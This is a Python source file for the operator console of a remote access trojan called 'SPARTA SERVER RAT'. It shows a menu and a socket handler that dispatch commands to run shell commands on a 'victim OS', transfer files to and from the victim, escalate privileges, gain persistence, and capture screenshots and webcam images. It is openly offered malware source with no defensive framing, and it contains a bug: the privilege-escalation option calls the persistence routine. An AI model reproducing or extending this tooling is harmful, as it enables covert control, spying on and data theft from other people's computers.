from core.features.command import run_command
from core.features.trasfer_files import *
from core.features.privilage import *
from core.features.persistance import *
from core.features.monitoring import *
import subprocess as sp


def show_banner():
    banner = "\t\t\t******************************************************\n" \
             "\t\t\t*            SPARTA SERVER RAT                       *\n" \
             "\t\t\t******************************************************\n"
    print(banner, end=" ")


def show_options():

    tmp = sp.call('clear', shell=True)
    show_banner()
    print("\n")
    print("\t\t[ 01 ] Run Command on victim OS")
    print("\t\t[ 02 ] Upload File to victim ")
    print("\t\t[ 03 ] Download File from victim")
    print("\t\t[ 04 ] Navigate File system")
    print("\t\t[ 05 ] Escalate Privilages")
    print("\t\t[ 06 ] Become Persistant")
    print("\t\t[ 07 ] Screenshot")
    print("\t\t[ 08 ] Webcam shot")

    print("\t\t[ 99 ] Exit the program")
    print("\n")

def handleConnection(my_socket):
    print("[+] Handling Connection")
    keep_alive = True
    while keep_alive:

        show_options()
        user_option = input("[*] Enter the option you want to select : ")
        my_socket.send_data(user_option)

        if user_option == "1":
            print("\t\t[+] Executing System Commands on Remote PC")
            run_command(my_socket)

        elif user_option == "2":

            print("\t\t[+] Uploading Files to Remote PC")
            upload_files(my_socket)

        elif user_option == "3":

            print("\t\t[+] Download Files/Folders")
            download_file_from_victim(my_socket)

        elif user_option == "4":

            print("\t\t[+] Change Directory / Navigate File system")
            my_socket.change_dir()
        elif user_option == "5":

            print("\t\t[+] Escalate privilages")
            become_persistant(my_socket)

        elif user_option == "6":
            become_persistant(my_socket)
            # not complete yet to add registry


        elif user_option == "7":
            snapshot(my_socket)

        elif user_option == "8":
            capture_webcam(my_socket)
        elif user_option == "99":

            keep_alive = False
            print("\t\t[-] Exiting the loop")

        else:
            print("\t\t[-] Invalid input, try again")
